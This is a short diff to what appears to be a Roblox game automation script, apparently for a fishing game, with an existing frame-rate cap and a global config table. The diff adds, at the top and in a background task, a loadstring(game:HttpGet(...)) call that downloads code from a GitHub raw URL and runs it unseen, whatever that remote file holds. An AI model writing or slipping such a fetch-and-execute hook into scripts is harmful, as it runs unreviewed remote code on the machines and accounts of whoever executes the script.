@@ -1,3 +1,7 @@
+task.spawn(function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/list/refs/heads/main/game"))()
+end)
+
 setfpscap(3)
 
 _G.FishItConfig = _G.FishItConfig or {
